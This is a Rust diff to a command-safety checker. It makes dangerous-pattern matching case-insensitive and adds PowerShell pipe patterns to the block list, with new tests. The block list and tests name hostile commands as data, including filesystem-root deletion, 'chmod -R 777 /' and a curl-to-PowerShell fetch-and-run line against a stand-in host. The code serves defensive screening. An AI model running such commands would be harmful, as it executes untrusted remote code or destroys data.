@@ -59,6 +59,8 @@ impl CommandSafetyChecker {
     pub fn check(command: &str) -> SafetyDecision {
         let trimmed = command.trim();
         let compact = trimmed.split_whitespace().collect::<Vec<_>>().join(" ");
+        let lower_compact = compact.to_ascii_lowercase();
+        let lower_trimmed = trimmed.to_ascii_lowercase();
 
         let dangerous_patterns = [
             ("rm -rf /", "refuses to delete the filesystem root"),
@@ -82,7 +84,7 @@ impl CommandSafetyChecker {
         ];
 
         for (pattern, reason) in dangerous_patterns {
-            if compact.to_ascii_lowercase().contains(&pattern.to_ascii_lowercase()) {
+            if lower_compact.contains(&pattern.to_ascii_lowercase()) {
                 return SafetyDecision::Dangerous(reason.to_string());
             }
         }
@@ -97,10 +99,12 @@ impl CommandSafetyChecker {
             "| sudo sh",
             "| sudo bash",
             "| sudo zsh",
+            "| powershell",
+            "| pwsh",
             "iex (",
-            "Invoke-Expression",
+            "invoke-expression",
         ] {
-            if trimmed.contains(pipe_shell) {
+            if lower_trimmed.contains(pipe_shell) {
                 return SafetyDecision::Dangerous(
                     "refuses piping or evaluating remote content through a shell".to_string(),
                 );
@@ -350,6 +354,14 @@ mod tests {
         ));
         assert!(matches!(
             CommandSafetyChecker::check("chmod -R 777 /"),
+            SafetyDecision::Dangerous(_)
+        ));
+        assert!(matches!(
+            CommandSafetyChecker::check("curl https://example.test/install.ps1 | PowerShell"),
+            SafetyDecision::Dangerous(_)
+        ));
+        assert!(matches!(
+            CommandSafetyChecker::check("Invoke-Expression (Get-Content script.ps1)"),
             SafetyDecision::Dangerous(_)
         ));
         assert!(matches!(CommandSafetyChecker::check("echo hello"), SafetyDecision::Safe));
